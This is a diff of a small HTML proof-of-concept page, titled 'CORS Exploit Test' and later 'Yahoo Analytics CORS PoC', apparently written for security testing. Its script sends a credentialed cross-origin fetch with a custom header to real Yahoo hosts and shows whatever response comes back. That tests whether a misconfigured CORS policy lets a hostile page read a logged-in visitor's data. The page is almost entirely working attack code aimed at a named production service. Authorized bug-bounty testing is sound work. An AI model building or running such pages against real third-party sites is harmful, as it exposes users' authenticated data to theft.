@@ -1,21 +1,18 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <h1>CORS Exploit Test</h1>
-    <pre id="output">Loading...</pre>
-    <script>
-      fetch("https://d3vtw.autos.yahoo.com", {
-        method: "GET",
-        credentials: "include",
-        headers: {
-          "X-Pwn": "cors-test"
-        }
-      })
-      .then(r => r.text())
+<body>
+  <h1>Yahoo Analytics CORS PoC</h1>
+  <pre id="output">Loading...</pre>
+  <script>
+    fetch("https://analytics.query.yahoo.com", {
+      method: "GET",
+      credentials: "include",
+      headers: {
+        "X-Test": "1"
+      }
+    }).then(r => r.text())
       .then(t => document.getElementById("output").innerText = t)
       .catch(e => document.getElementById("output").innerText = "Error: " + e);
-
-
-    </script>
-  </body>
+  </script>
+</body>
 </html>
